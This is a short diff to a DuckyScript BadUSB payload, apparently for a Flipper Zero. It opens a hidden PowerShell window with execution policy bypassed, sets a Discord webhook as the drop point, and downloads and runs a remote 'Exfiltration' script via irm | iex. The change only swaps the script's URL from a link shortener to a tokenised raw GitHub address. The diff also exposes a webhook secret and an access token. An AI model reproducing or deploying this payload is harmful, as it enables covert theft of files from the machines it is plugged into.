@@ -13,5 +13,5 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1203832948487495850/rOxnIo1xBlIBeaNoAYH25Q3W1K170w8Bm-zXtvHZTCd97txe7Zwq60qiU7A9Q1aLjBWE'; irm https://is.gd/bw_ex_to_dc | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1203832948487495850/rOxnIo1xBlIBeaNoAYH25Q3W1K170w8Bm-zXtvHZTCd97txe7Zwq60qiU7A9Q1aLjBWE'; irm https://raw.githubusercontent.com/BlackMOTD/FlipperZero/main/Exfiltration/Fichiers_Discord/main.ps1?token=GHSAT0AAAAAACNZA7ONAFYLWWLWIDH63PZOZOBNQTA | iex
 ENTER
